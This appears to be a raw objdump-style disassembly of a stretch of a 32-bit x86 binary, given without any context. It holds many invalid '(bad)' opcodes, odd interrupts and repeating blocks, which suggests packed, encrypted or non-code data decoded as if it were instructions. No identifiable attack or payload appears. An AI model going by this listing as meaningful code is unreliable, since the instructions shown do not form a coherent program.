  4259e4:	jns    0x4259f0
  4259e6:	jbe    0x42598d
  4259e8:	iret   
  4259e9:	jbe    0x425998
  4259eb:	or     dh,BYTE PTR [esi+0xd]
  4259ee:	int    0x76
  4259f0:	or     eax,0x8621d169
  4259f5:	xor    eax,0x37b680c9
  4259fa:	ficom  WORD PTR [ebx]
  4259fc:	or     bh,BYTE PTR [esp+eax*4-0x33]
  425a00:	(bad)  
  425a01:	std    
  425a02:	int    0x96
  425a04:	std    
  425a05:	cmp    ecx,DWORD PTR [edi]
  425a07:	shr    ebx,cl
  425a09:	xchg   edx,eax
  425a0a:	sar    bh,0x9c
  425a0d:	cmp    esi,ecx
  425a0f:	shr    edx,cl
  425a11:	sub    BYTE PTR [ebx+0x13],dl
  425a14:	int    0x96
  425a16:	std    
  425a17:	int    0xa6
  425a19:	std    
  425a1a:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a20:	popf   
  425a21:	shl    ebp,cl
  425a23:	sub    BYTE PTR [ebx-0x2b],dl
  425a26:	xchg   DWORD PTR [ebx],edx
  425a28:	int    0x96
  425a2a:	std    
  425a2b:	int    0xa6
  425a2d:	std    
  425a2e:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a34:	popf   
  425a35:	shl    ebp,cl
  425a37:	sub    BYTE PTR [ebx-0x2b],dl
  425a3a:	xchg   DWORD PTR [ebx],edx
  425a3c:	int    0x96
  425a3e:	std    
  425a3f:	int    0xa6
  425a41:	std    
  425a42:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a48:	popf   
  425a49:	shl    ebp,cl
  425a4b:	sub    BYTE PTR [ebx-0x2b],dl
  425a4e:	xchg   DWORD PTR [ebx],edx
  425a50:	or     cl,bh
  425a52:	nop
  425a53:	add    BYTE PTR [eax],al
  425a55:	add    ch,cl
  425a57:	lea    edi,[ebp+0x3bbd96cd]
  425a5d:	icebp  
  425a5e:	cmp    ecx,DWORD PTR [edi]
  425a60:	shr    edx,cl
  425a62:	sub    bl,dl
  425a64:	jmp    0x4259f8
  425a66:	push   ebx
  425a67:	adc    ecx,ebp
  425a69:	xchg   esi,eax
  425a6a:	mov    ebp,0x3bbda6cd
  425a6f:	cdq    
  425a70:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425a76:	in     eax,0x28
  425a78:	push   ebx
  425a79:	aad    0xa
  425a7b:	int3   
  425a7c:	pop    ss
  425a7d:	aam    0x0
  425a7f:	add    BYTE PTR [eax],al
  425a81:	int    0x8d
  425a83:	dec    esp
  425a84:	int    0x89
  425a86:	int    0x96
  425a88:	std    
  425a89:	int    0xa6
  425a8b:	std    
  425a8c:	int    0x7e
  425a8e:	jo     0x425acb
  425a90:	popf   
  425a91:	cmp    ebx,DWORD PTR [ecx-0x2c6d0c2d]
  425a97:	in     eax,0x28
  425a99:	push   ebx
  425a9a:	aad    0xa
  425a9c:	int3   
  425a9d:	pop    ss
  425a9e:	aam    0x0
  425aa0:	add    BYTE PTR [eax],al
  425aa2:	int    0x8d
  425aa4:	xor    ch,cl
  425aa6:	xchg   esi,eax
  425aa7:	xor    BYTE PTR [ebx],bh
  425aa9:	icebp  
  425aaa:	cmp    ecx,DWORD PTR [edi]
  425aac:	shr    edx,cl
  425aae:	sub    bl,dl
  425ab0:	jmp    0x425a44
  425ab2:	push   ebx
  425ab3:	adc    ecx,ebp
  425ab5:	xchg   esi,eax
  425ab6:	std    
  425ab7:	int    0xa6
  425ab9:	std    
  425aba:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  425ac0:	cdq    
  425ac1:	shl    ebx,cl
  425ac3:	xchg   edx,eax
  425ac4:	shl    ebp,cl
  425ac6:	sub    BYTE PTR [ebx-0x2b],dl
  425ac9:	int    0xa6
  425acb:	std    
  425acc:	cmp    edi,DWORD PTR [ecx-0x2d]
  425acf:	mov    ebp,0xfff40492
  425ad4:	shl    ebp,cl
  425ad6:	sub    BYTE PTR [ebx-0x3b],dl
  425ad9:	xchg   ecx,esi
  425adb:	int    0x76
  425add:	adc    al,0xa
  425adf:	int3   
  425ae0:	pop    ss
  425ae1:	aam    0x0
  425ae3:	add    BYTE PTR [eax],al
  425ae5:	int    0x8d
  425ae7:	adc    al,0x4
  425ae9:	add    bh,bh
  425aeb:	shl    edx,cl
  425aed:	sub    BYTE PTR [ebx],bh
  425aef:	jns    0x425ac4
  425af1:	mov    ebp,0xcdd35392
  425af6:	(bad)  
  425af7:	std    
  425af8:	int    0x96
  425afa:	std    
  425afb:	add    al,0xfb
  425afd:	(bad)  
  425afe:	cmp    ecx,DWORD PTR [edi]
  425b00:	shr    edx,cl
  425b02:	sub    bl,dl
  425b04:	jmp    0x425a98
  425b06:	push   ebx
  425b07:	adc    ecx,ebp
  425b09:	xchg   esi,eax
  425b0a:	std    
  425b0b:	int    0xa6
  425b0d:	std    
  425b0e:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425b14:	repz xchg edx,eax
  425b16:	shl    ebp,cl
  425b18:	sub    BYTE PTR [ebx-0x2b],dl
  425b1b:	xchg   DWORD PTR [ebx],edx
  425b1d:	int    0x96
  425b1f:	std    
  425b20:	int    0xa6
  425b22:	std    
  425b23:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425b29:	in     eax,0x28
  425b2b:	shl    ebx,cl
  425b2d:	xchg   edx,eax
  425b2e:	push   ebx
  425b2f:	aad    0x87
  425b31:	adc    ecx,DWORD PTR [edx]
  425b33:	add    eax,0xd4cf
  425b38:	add    bh,cl
  425b3a:	push   es
  425b3b:	nop
  425b3c:	add    BYTE PTR [eax],al
  425b3e:	add    BYTE PTR [eax-0x33],dh
  425b41:	jbe    0x425b40
  425b43:	int    0x8d
  425b45:	std    
  425b46:	sar    bh,0x63
  425b49:	cmp    edi,DWORD PTR [ecx+0x3b]
  425b4c:	or     al,0xd3
  425b4e:	mov    ebp,0x28f2d392
  425b53:	push   ebx
  425b54:	shl    DWORD PTR [eax-0x33],cl
  425b57:	jbe    0x425b85
  425b59:	iret   
  425b5a:	or     DWORD PTR [ecx-0x80],eax
  425b5d:	add    BYTE PTR [eax+0x3d01cd71],0x81
  425b64:	add    BYTE PTR [eax-0x69ffb000],0x24
  425b6b:	int    0x8d
  425b6d:	push   esp
  425b6e:	or     al,BYTE PTR [ecx-0x32528933]
  425b74:	lea    esi,[ebp-0x6d82bad1]
  425b7a:	shr    ebx,cl
  425b7c:	xchg   edx,eax
  425b7d:	int    0x8d
  425b7f:	lods   eax,DWORD PTR ds:[esi]
  425b80:	int    0x96
  425b82:	mov    ch,0x3b
  425b84:	leave  
  425b85:	cmp    ebx,edx
  425b87:	push   ebx
  425b88:	icebp  
  425b89:	bound  eax,QWORD PTR [eax]
  425b8b:	(bad)  
  425b8c:	xor    al,0xd3
  425b8e:	repnz sub BYTE PTR [eax],al
  425b91:	(bad)  
  425b92:	inc    esp
  425b93:	mov    ebp,0xfb94
  425b98:	int    0x76
  425b9a:	lods   eax,DWORD PTR ds:[esi]
  425b9b:	int    0x8d
  425b9d:	mov    ch,0x2f
  425b9f:	inc    ebp
  425ba0:	jge    0x425b34
  425ba2:	shr    ebx,cl
  425ba4:	xchg   edx,eax
  425ba5:	int    0x8d
  425ba7:	lods   eax,DWORD PTR ds:[esi]
  425ba8:	int    0x96
  425baa:	mov    ch,0x3b
  425bac:	leave  
  425bad:	cmp    ebx,edx
  425baf:	push   ebx
  425bb0:	icebp  
  425bb1:	bound  eax,QWORD PTR [eax]
  425bb3:	(bad)  
  425bb4:	push   esp
  425bb5:	shl    edx,cl
  425bb7:	sub    BYTE PTR [eax],al
  425bb9:	(bad)  
  425bba:	cmp    al,0xbd
  425bbc:	inc    esp
  425bbd:	sti    
  425bbe:	add    BYTE PTR [eax],al
  425bc0:	int    0x76
  425bc2:	std    
  425bc3:	int    0x8d
  425bc5:	std    
  425bc6:	cmp    ecx,DWORD PTR [ebx+edx*8]
  425bc9:	repnz sub BYTE PTR [ebx],bh
  425bcc:	jns    0x425ba1
  425bce:	mov    ebp,0xcdd35392
  425bd3:	(bad)  
  425bd4:	std    
  425bd5:	int    0x96
  425bd7:	std    
  425bd8:	cmp    ecx,DWORD PTR [edi]
  425bda:	shr    ebx,cl
  425bdc:	xchg   edx,eax
  425bdd:	cmp    edx,ebp
  425bdf:	shr    edx,cl
  425be1:	sub    BYTE PTR [ebx+0x13],dl
  425be4:	xchg   ebx,edx
  425be6:	int    0x8d
  425be8:	std    
  425be9:	int    0x96
  425beb:	std    
  425bec:	cmp    ecx,DWORD PTR [edi]
  425bee:	shr    ebx,cl
  425bf0:	xchg   edx,eax
  425bf1:	cmp    edx,ebp
  425bf3:	shr    edx,cl
  425bf5:	sub    BYTE PTR [ebx+0x13],dl
  425bf8:	xchg   ebx,edx
  425bfa:	int    0x8d
  425bfc:	std    
  425bfd:	int    0x96
  425bff:	std    
  425c00:	cmp    ecx,DWORD PTR [edi]
  425c02:	shr    ebx,cl
  425c04:	xchg   edx,eax
  425c05:	cmp    edx,ebp
  425c07:	shr    edx,cl
  425c09:	sub    BYTE PTR [ebx+0x13],dl
  425c0c:	xchg   ebx,edx
  425c0e:	or     al,BYTE PTR [esi]
  425c10:	nop
  425c11:	add    BYTE PTR [eax],al
  425c13:	add    ch,cl
  425c15:	jbe    0x425c6b
  425c17:	int    0x80
  425c19:	int    0x8d
  425c1b:	mov    ebp,0x3bbd96cd
  425c20:	(bad)  
  425c22:	aad    0xd3
  425c24:	jmp    0x425bb8
  425c26:	shr    edx,cl
  425c28:	sub    BYTE PTR [ebx+0x13],dl
  425c2b:	or     al,BYTE PTR ds:0xd4cf
  425c31:	add    ch,cl
  425c33:	jbe    0x425c81
  425c35:	int    0x80
  425c37:	int    0x8d
  425c39:	std    
  425c3a:	int    0x96
  425c3c:	std    
  425c3d:	cmp    ecx,DWORD PTR [edi]
  425c3f:	shr    ebx,cl
  425c41:	xchg   edx,eax
  425c42:	int    0x6c
  425c44:	jo     0x425c81
  425c46:	aad    0xd3
  425c48:	jmp    0xcf05:0xa135328
  425c4f:	aam    0x0
  425c51:	add    BYTE PTR [eax],al
  425c53:	int    0x76
  425c55:	sbb    al,0xcd
  425c57:	lea    ebx,[ebx+edi*1]
  425c5a:	or     al,0xd3
  425c5c:	repnz sub BYTE PTR [ebx],bh
  425c5f:	jns    0x425c34
  425c61:	mov    ebp,0xcdd35392
  425c66:	(bad)  
  425c67:	std    
  425c68:	int    0x96
  425c6a:	std    
  425c6b:	cmp    edx,ebp
  425c6d:	cmp    ecx,DWORD PTR [edi]
  425c6f:	shr    edx,cl
  425c71:	sub    bl,dl
  425c73:	jmp    0x425c07
  425c75:	push   ebx
  425c76:	adc    ecx,ebp
  425c78:	xchg   esi,eax
  425c79:	std    
  425c7a:	int    0xa6
  425c7c:	std    
  425c7d:	cmp    ebx,DWORD PTR [ecx+0x492f3d3]
  425c83:	hlt    
  425c84:	call   ebx
  425c86:	in     eax,0x28
  425c88:	push   ebx
  425c89:	aad    0x87
  425c8b:	adc    ecx,DWORD PTR [edx]
  425c8d:	add    eax,0xd4cf
  425c92:	add    ch,cl
  425c94:	jbe    0x425c93
  425c96:	int    0x8d
  425c98:	std    
  425c99:	add    al,0x2
  425c9b:	call   ebx
  425c9d:	repnz sub BYTE PTR [ebx],bh
  425ca0:	jns    0x425c75
  425ca2:	mov    ebp,0xcdd35392
  425ca7:	(bad)  
  425ca8:	std    
  425ca9:	int    0x96
  425cab:	std    
  425cac:	add    al,0xfb
  425cae:	(bad)  
  425caf:	cmp    ecx,DWORD PTR [edi]
  425cb1:	shr    edx,cl
  425cb3:	sub    bl,dl
  425cb5:	jmp    0x425c49
  425cb7:	push   ebx
  425cb8:	adc    eax,DWORD PTR [edi-0x272322d]
  425cbe:	int    0x96
  425cc0:	std    
  425cc1:	add    al,0xfb
  425cc3:	(bad)  
  425cc4:	cmp    ecx,DWORD PTR [edi]
  425cc6:	shr    edx,cl
  425cc8:	sub    bl,dl
  425cca:	jmp    0x425c5e
  425ccc:	push   ebx
  425ccd:	adc    ecx,edi
  425ccf:	pop    ss
  425cd0:	nop
  425cd1:	add    BYTE PTR [eax],al
  425cd3:	add    BYTE PTR [edx-0x33],ah
  425cd6:	xchg   esi,eax
  425cd7:	std    
  425cd8:	int    0xa6
  425cda:	std    
  425cdb:	xchg   ebx,edx
  425cdd:	cmp    ebx,DWORD PTR [ecx+0xaa58dcf]
  425ce3:	int3   
  425ce4:	push   es
  425ce5:	aam    0x0
  425ce7:	add    BYTE PTR [eax],al
  425ce9:	int    0x76
  425ceb:	sub    al,0x4
  425ced:	hlt    
  425cee:	call   ebx
  425cf0:	repz xchg edx,eax
  425cf2:	shl    ebp,cl
  425cf4:	sub    BYTE PTR [ebx-0x2b],dl
  425cf7:	iret   
  425cf8:	or     edi,ebp
  425cfa:	add    BYTE PTR [eax+0x3d01cd80],0x81
  425d01:	add    BYTE PTR [eax+0x50007162],0x0
  425d08:	xchg   esi,eax
  425d09:	and    al,0x6
  425d0b:	ins    DWORD PTR es:[edi],dx
  425d0c:	aam    0xbc
  425d0e:	int    0x76
  425d10:	in     eax,dx
  425d11:	int    0x8d
  425d13:	adc    DWORD PTR [edi],ebp
  425d15:	inc    ebp
  425d16:	jge    0x425caa
  425d18:	shr    ebx,cl
  425d1a:	xchg   edx,eax
  425d1b:	int    0xe3
  425d1d:	int    0x7d
  425d1f:	int    0x76
  425d21:	in     eax,dx
  425d22:	int    0x96
  425d24:	adc    DWORD PTR [ebx],edi
  425d26:	fidivr DWORD PTR [ebx]
  425d28:	lock shr DWORD PTR [ebp+0x4c76cd28],cl
  425d2f:	push   ebx
  425d30:	adc    ecx,ebp
  425d32:	xor    BYTE PTR [ebx-0x76],al
  425d35:	jo     0x425d04
  425d37:	xchg   esi,eax
  425d38:	push   esp
  425d39:	in     al,dx
  425d3a:	push   esp
  425d3b:	int    0x92
  425d3d:	int    0xa6
  425d3f:	push   eax
  425d40:	retf   0x5324
  425d43:	or     DWORD PTR [eax+ecx*4],esp
  425d46:	int    0x76
  425d48:	cmc    
  425d49:	int    0x8d
  425d4b:	stc    
  425d4c:	das    
  425d4d:	inc    ebp
  425d4e:	jge    0x425ce2
  425d50:	shr    ebx,cl
  425d52:	xchg   edx,eax
  425d53:	int    0x8d
  425d55:	cmc    
  425d56:	int    0xa6
  425d58:	stc    
  425d59:	cmp    ecx,ecx
  425d5b:	cmp    ebx,ebp
  425d5d:	shl    edx,cl
  425d5f:	sub    ch,cl
  425d61:	lea    esi,[eax]
  425d63:	push   ebx
  425d64:	lds    eax,FWORD PTR [edi+0x4c76cd7d]
  425d6a:	int    0x1c
  425d6c:	inc    ebx
  425d6d:	(bad)  
  425d6e:	jo     0x425d7a
  425d70:	lea    esi,[eax]
  425d72:	or     cl,0xec
  425d75:	xchg   ch,cl
  425d77:	xchg   esi,eax
  425d78:	push   esp
  425d79:	int    0x76
  425d7b:	dec    esp
  425d7c:	int    0x4a
  425d7e:	int    0x20
  425d80:	xchg   DWORD PTR [esi-0x32e3f59c],ebx
  425d86:	sbb    al,0xcd
  425d88:	dec    edx
  425d89:	xchg   ebp,ecx
  425d8b:	sub    eax,0xa808080
  425d90:	lea    esi,[eax]
  425d92:	int    0x4a
  425d94:	int    0xa6
  425d96:	push   eax
  425d97:	xor    ecx,DWORD PTR [ecx*8+0x530a88a6]
  425d9e:	int    0x80
  425da0:	int    0x4a
  425da2:	xchg   DWORD PTR [esp+edi*1-0x33],edi
  425da6:	jbe    0x425d95
  425da8:	or     cl,BYTE PTR [ebp+0x118dcd0d]
  425dae:	das    
  425daf:	inc    ebp
  425db0:	jge    0x425d44
  425db2:	shr    ebx,cl
  425db4:	xchg   edx,eax
  425db5:	int    0x8d
  425db7:	in     eax,dx
  425db8:	int    0xa6
  425dba:	adc    DWORD PTR [ebx],edi
  425dbc:	leave  
  425dbd:	cmp    ebx,ebp
  425dbf:	shl    edx,cl
  425dc1:	sub    BYTE PTR [ebx-0x3b],dl
  425dc4:	or     dh,BYTE PTR [esi+0x44]
  425dc7:	int    0x76
  425dc9:	xor    bl,ch
  425dcb:	les    eax,FWORD PTR [ecx+0x76cd8080]
  425dd1:	in     eax,dx
  425dd2:	int    0x8d
  425dd4:	adc    DWORD PTR [edi],ebp
  425dd6:	inc    ebp
  425dd7:	jge    0x425d6b
  425dd9:	shr    ebx,cl
  425ddb:	xchg   edx,eax
  425ddc:	int    0x8d
  425dde:	in     eax,dx
  425ddf:	int    0xa6
  425de1:	adc    ebx,edx
  425de3:	repnz sub ch,cl
  425de6:	lea    edx,[ebx+edi*1]
  425de9:	leave  
  425dea:	cmp    ebx,ebp
  425dec:	add    al,0xd3
  425dee:	stc    
  425def:	push   ebx
  425df0:	(bad)
  425df3:	inc    ebx
  425df4:	shr    DWORD PTR [edi],cl
  425df6:	add    al,0xf7
  425df8:	add    BYTE PTR [eax+0x30a6cd80],0xcf
  425dff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e00:	dec    ebx
  425e01:	mov    BYTE PTR [ebx],dh
  425e03:	jge    0x425e0f
  425e05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e06:	xor    al,0xa
  425e08:	lea    edi,[ecx*8+0x76cdf18d]
  425e0f:	xchg   ebp,eax
  425e10:	das    
  425e11:	inc    ebp
  425e12:	rcl    DWORD PTR [edx-0x326d422d],cl
  425e18:	jbe    0x425e0b
  425e1a:	int    0xa6
  425e1c:	xchg   ebp,eax
  425e1d:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425e23:	cmp    esi,eax
  425e25:	cmp    ebx,ebp
  425e27:	push   ebx
  425e28:	or     al,0xcd
  425e2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e2b:	stc    
  425e2c:	das    
  425e2d:	inc    ebp
  425e2e:	popf   
  425e2f:	xchg   edx,eax
  425e30:	or     dh,BYTE PTR [esi+0x54]
  425e33:	int    0x76
  425e35:	cmc    
  425e36:	push   ecx
  425e37:	out    0x54,al
  425e39:	add    al,0xd3
  425e3b:	dec    edx
  425e3c:	shr    esp,cl
  425e3e:	xchg   edx,eax
  425e3f:	int    0xa6
  425e41:	stc    
  425e42:	cmp    ebx,ebp
  425e44:	mov    DWORD PTR [esi+0x54b6d554],esp
  425e4a:	int    0xa6
  425e4c:	cmc    
  425e4d:	int    0x8d
  425e4f:	stc    
  425e50:	das    
  425e51:	inc    ebp
  425e52:	or     al,0x92
  425e54:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425e5a:	shr    ebx,cl
  425e5c:	xchg   edx,eax
  425e5d:	int    0x8d
  425e5f:	stc    
  425e60:	cmp    ecx,ebx
  425e62:	shr    DWORD PTR [ebp+0x5476cd28],cl
  425e68:	cmp    esp,ecx
  425e6a:	push   ebx
  425e6b:	fcmovne st,st(5)
  425e6d:	lea    esi,[edi+ebp*1]
  425e70:	mov    ebx,0x2bc53389
  425e75:	ror    ebp,cl
  425e77:	(bad)  
  425e78:	icebp  
  425e79:	or     dh,BYTE PTR [esi+0x54]
  425e7c:	int    0x76
  425e7e:	xchg   ebp,eax
  425e7f:	das    
  425e80:	inc    ebp
  425e81:	rcl    DWORD PTR [edx-0x326d422d],cl
  425e87:	jbe    0x425e7a
  425e89:	int    0xa6
  425e8b:	xchg   ebp,eax
  425e8c:	shr    DWORD PTR [ebp+0x3476cd28],cl
  425e92:	das    
  425e93:	mov    ebx,0xa6020180
  425e98:	cmp    ebx,ebp
  425e9a:	dec    edx
  425e9b:	or     al,0x1
  425e9d:	ror    DWORD PTR [edx-0x2b],cl
  425ea0:	mov    ebp,0xbdbfcb3b
  425ea5:	or     ah,BYTE PTR [ebx]
  425ea7:	and    eax,0x92d3352f
  425eac:	shr    DWORD PTR [ebp+0x37d65692],cl
  425eb2:	ficom  WORD PTR [ebx]
  425eb4:	cmp    ecx,DWORD PTR [esi+eiz*2]
  425eb7:	fidiv  WORD PTR [edi]
  425eb9:	ficom  WORD PTR [ebx]
  425ebb:	(bad)  
  425ebc:	ss inc ebx
  425ebe:	or     al,0xd6
  425ec0:	cs int 0x92
  425ec3:	int    0x8d
  425ec5:	xor    BYTE PTR [edi+0x548dcd81],al
  425ecb:	add    al,0x64
  425ecd:	mov    BYTE PTR [eax-0x6d32ce2c],al
  425ed3:	int    0x8d
  425ed5:	xor    BYTE PTR [edi-0x7772327f],al
  425edb:	xchg   DWORD PTR [esi+0x54],esi
  425ede:	int    0x89
  425ee0:	or     DWORD PTR [eax-0x6dcb89fc],0x2f3c8d00
  425eea:	push   es
  425eeb:	and    eax,DWORD PTR [eax]
  425eed:	add    BYTE PTR [eax],al
  425eef:	in     al,dx
  425ef0:	test   DWORD PTR [edi+0x25230abd],edi
  425ef6:	int    0x76
  425ef8:	adc    al,0x81
  425efa:	jbe    0x425f40
  425efc:	leave  
  425efd:	jbe    0x425f6c
  425eff:	scas   al,BYTE PTR es:[edi]
  425f00:	aaa    
  425f01:	ficom  WORD PTR [ebx]
  425f03:	or     ah,BYTE PTR [esi+0x6d76cd75]
  425f09:	int    0x8d
  425f0b:	jne    0x425f3c
  425f0d:	inc    ebp
  425f0e:	jge    0x425ea2
  425f10:	shr    ebx,cl
  425f12:	xchg   edx,eax
  425f13:	int    0x8d
  425f15:	ins    DWORD PTR es:[edi],dx
  425f16:	int    0xa6
  425f18:	jne    0x425eed
  425f1a:	repnz sub ch,cl
  425f1d:	lea    ecx,[ebp+ecx*8-0x77]
  425f21:	cmp    ecx,ecx
  425f23:	cmp    ebx,ebp
  425f25:	push   ebx
  425f26:	(bad)
  425f29:	shl    esp,cl
  425f2b:	int    0x8d
  425f2d:	inc    esp
  425f2e:	inc    ebx
  425f2f:	mov    BYTE PTR [edi+0x54],dh
  425f32:	int    0x76
  425f34:	xor    BYTE PTR [edi+0x760a1476],al
  425f3a:	xor    ch,cl
  425f3c:	ins    BYTE PTR es:[edi],dx
  425f3d:	test   BYTE PTR [edx],cl
  425f3f:	jbe    0x425f55
  425f41:	int    0x76
  425f43:	in     eax,dx
  425f44:	int    0x8d
  425f46:	adc    DWORD PTR [edi],ebp
  425f48:	inc    ebp
  425f49:	jge    0x425edd
  425f4b:	shr    ebx,cl
  425f4d:	xchg   edx,eax
  425f4e:	int    0x8d
  425f50:	in     eax,dx
  425f51:	int    0xa6
  425f53:	adc    DWORD PTR [ebx],edi
  425f55:	fnstsw WORD PTR [ebx]
  425f57:	leave  
  425f58:	push   ebx
  425f59:	(bad)
  425f5c:	sub    BYTE PTR [esi+0x76],bl
  425f5f:	adc    al,0x2f
  425f61:	push   es
  425f62:	mov    esi,0xcd0000ff
  425f67:	(bad)  
  425f68:	std    
  425f69:	int    0x96
  425f6b:	std    
  425f6c:	cmp    ecx,DWORD PTR [edi]
  425f6e:	shr    ebx,cl
  425f70:	xchg   edx,eax
  425f71:	sar    bh,0x9c
  425f74:	cmp    esi,ecx
  425f76:	shr    edx,cl
  425f78:	sub    BYTE PTR [ebx+0x13],dl
  425f7b:	int    0x96
  425f7d:	std    
  425f7e:	int    0xa6
  425f80:	std    
  425f81:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425f87:	popf   
  425f88:	shl    ebp,cl
  425f8a:	sub    BYTE PTR [ebx-0x2b],dl
  425f8d:	xchg   DWORD PTR [ebx],edx
  425f8f:	int    0x96
  425f91:	std    
  425f92:	int    0xa6
  425f94:	std    
  425f95:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425f9b:	popf   
  425f9c:	shl    ebp,cl
  425f9e:	sub    BYTE PTR [ebx-0x2b],dl
  425fa1:	xchg   DWORD PTR [ebx],edx
  425fa3:	int    0x96
  425fa5:	std    
  425fa6:	int    0xa6
  425fa8:	std    
  425fa9:	cmp    ebx,DWORD PTR [ecx-0xc2c62c5]
  425faf:	xchg   edx,eax
  425fb0:	shl    ebp,cl
  425fb2:	sub    BYTE PTR [ebx-0x2b],dl
  425fb5:	xchg   DWORD PTR [ebx],edx
  425fb7:	or     cl,bh
  425fb9:	nop
  425fba:	add    BYTE PTR [eax],al
  425fbc:	add    ch,cl
  425fbe:	lea    edx,[eax-0x33]
  425fc1:	xchg   esi,eax
  425fc2:	mov    ebp,0x3bbda6cd
  425fc7:	cdq    
  425fc8:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425fce:	in     eax,0x28
  425fd0:	push   ebx
  425fd1:	aad    0xa
  425fd3:	int3   
  425fd4:	pop    ss
  425fd5:	aam    0x0
  425fd7:	add    BYTE PTR [eax],al
  425fd9:	int    0x8d
  425fdb:	dec    esp
  425fdc:	int    0x89
  425fde:	int    0x96
  425fe0:	std    
  425fe1:	int    0xa6
  425fe3:	std    
  425fe4:	int    0x7e
  425fe6:	jo     0x426023
  425fe8:	cdq    
  425fe9:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425fef:	in     eax,0x28
  425ff1:	push   ebx
  425ff2:	aad    0xa
  425ff4:	int3   
  425ff5:	pop    ss
  425ff6:	aam    0x0
  425ff8:	add    BYTE PTR [eax],al
  425ffa:	int    0x8d
  425ffc:	sbb    al,0xcd
  425ffe:	xchg   esi,eax
  425fff:	sbb    al,0x3b
  426001:	icebp  
  426002:	shr    edx,cl
  426004:	sub    BYTE PTR [ebx],bh
  426006:	psrlq  mm5,mm3
  426009:	xchg   edx,eax
  42600a:	push   ebx
  42600b:	adc    ecx,ebp
  42600d:	xchg   esi,eax
  42600e:	std    
  42600f:	int    0xa6
  426011:	std    
  426012:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  426018:	cdq    
  426019:	shl    ebp,cl
  42601b:	sub    bl,dl
  42601d:	repz xchg edx,eax
  42601f:	push   ebx
  426020:	aad    0xcd
  426022:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426023:	std    
  426024:	cmp    edi,DWORD PTR [ecx+0x4]
  426027:	hlt    
  426028:	call   ebx
  42602a:	mov    ebp,0x28e5d392
  42602f:	push   ebx
  426030:	lds    eax,FWORD PTR [edi+0x17cc0af1]
  426036:	aam    0x0
  426038:	add    BYTE PTR [eax],al
  42603a:	int    0x8d
  42603c:	std    
  42603d:	int    0x96
  42603f:	std    
  426040:	cmp    ecx,DWORD PTR [edi]
  426042:	shr    ebx,cl
  426044:	xchg   edx,eax
  426045:	sar    bh,0x9c
  426048:	cmp    esi,ecx
  42604a:	shr    edx,cl
  42604c:	sub    BYTE PTR [ebx+0x13],dl
  42604f:	int    0x96
  426051:	std    
  426052:	int    0xa6
  426054:	std    
  426055:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42605b:	popf   
  42605c:	shl    ebp,cl
  42605e:	sub    BYTE PTR [ebx-0x2b],dl
  426061:	xchg   DWORD PTR [ebx],edx
  426063:	int    0x96
  426065:	std    
  426066:	int    0xa6
  426068:	std    
  426069:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42606f:	popf   
  426070:	shl    ebp,cl
  426072:	sub    BYTE PTR [ebx-0x2b],dl
  426075:	xchg   DWORD PTR [ebx],edx
  426077:	iret   
  426078:	xchg   esi,eax
  426079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42607a:	or     dl,BYTE PTR ds:0xd4cf
  426080:	add    bh,cl
  426082:	iret   
  426083:	nop
  426084:	add    BYTE PTR [eax],al
  426086:	add    BYTE PTR [ecx-0x33],dh
  426089:	(bad)  
  42608a:	std    
  42608b:	int    0x96
  42608d:	std    
  42608e:	cmp    ecx,DWORD PTR [edi]
  426090:	int    0xd6
  426092:	sub    al,0x3b
  426094:	icebp  
  426095:	shr    ebx,cl
  426097:	xchg   edx,eax
  426098:	shr    edx,cl
  42609a:	sub    BYTE PTR [ebx+0x13],dl
  42609d:	jno    0x42606e
  42609f:	pop    es
  4260a0:	out    dx,eax
  4260a1:	add    BYTE PTR [eax+0x7cd7080],0x3d
  4260a8:	add    DWORD PTR [eax+0x500080],0x7cd2496
  4260b2:	add    DWORD PTR [ecx+0x760a8080],eax
  4260b8:	dec    esp
  4260b9:	int    0x76
  4260bb:	mov    ch,cl
  4260bd:	mov    BYTE PTR [edi-0x72f5b373],al
  4260c3:	dec    esp
  4260c4:	int    0x8d
  4260c6:	cmc    
  4260c7:	int    0x96
  4260c9:	stc    
  4260ca:	das    
  4260cb:	inc    ebp
  4260cc:	jecxz  0x426060
  4260ce:	shl    ebx,cl
  4260d0:	xchg   edx,eax
  4260d1:	int    0x96
  4260d3:	cmc    
  4260d4:	int    0xd6
  4260d6:	stc    
  4260d7:	cmp    esi,edi
  4260d9:	shr    edx,cl
  4260db:	sub    ch,cl
  4260dd:	xchg   esi,eax
  4260de:	cmc    
  4260df:	cmp    esi,eax
  4260e1:	push   ebx
  4260e2:	bswap  ebp
  4260e4:	(bad)  
  4260e5:	stc    
  4260e6:	das    
  4260e7:	inc    ebp
  4260e8:	sti    
  4260e9:	xchg   edx,eax
  4260ea:	shr    edi,cl
  4260ec:	xchg   edx,eax
  4260ed:	int    0xd6
  4260ef:	cmc    
  4260f0:	int    0xa6
  4260f2:	stc    
  4260f3:	cmp    ebx,ecx
  4260f5:	cmp    ebx,ebp
  4260f7:	push   ebx
  4260f8:	aad    0x87
  4260fa:	adc    ecx,ebp
  4260fc:	xchg   esi,eax
  4260fd:	cmc    
  4260fe:	sar    DWORD PTR [ecx-0x62932d8],cl
  426104:	das    
  426105:	inc    ebp
  426106:	sti    
  426107:	xchg   edx,eax
  426108:	shr    edi,cl
  42610a:	xchg   edx,eax
  42610b:	int    0xd6
  42610d:	cmc    
  42610e:	int    0xa6
  426110:	stc    
  426111:	cmp    ebx,ecx
  426113:	cmp    ebx,ebp
